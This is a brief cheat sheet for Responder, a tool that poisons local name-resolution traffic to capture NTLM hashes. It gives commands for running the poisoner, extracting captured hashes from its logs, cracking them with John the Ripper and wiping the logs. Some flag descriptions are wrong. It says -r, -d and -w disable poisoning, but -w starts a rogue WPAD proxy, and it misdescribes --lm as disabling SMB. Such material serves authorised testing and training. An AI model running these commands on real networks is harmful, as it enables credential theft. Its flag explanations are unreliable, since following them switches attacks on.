# Responder

!!! tip "Tip"
    Run Responder in analyze mode first (`-A`) to see what traffic is hitting your interface before poisoning — this avoids disrupting the network unnecessarily.

!!! warning "Watch out"
    Responder and Impacket's SMB server conflict on port 445. If you're running both, disable Responder's SMB (`--lm`) or stop one before starting the other.

---

## Basic Usage

```bash
sudo responder -I eth0
```

---

## Listening on Multiple Interfaces

```bash
sudo responder -I eth0,wlan0
```

---

## Analyzing Captured Hashes

```bash
cat /var/log/responder/Responder-Session.log | grep -i ntlm
```

---

## Cracking Captured Hashes with John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /var/log/responder/Responder-Session.log
```

---

## Disabling Specific Poisoning Attacks

```bash
sudo responder -I eth0 -rdw
```

- `-r` → Disables NetBIOS relay poisoning.
- `-d` → Disables fingerprinting of responding hosts.
- `-w` → Disables WPAD poisoning.

---

## Clearing Logs Before a New Session

```bash
sudo rm -rf /var/log/responder/*
```
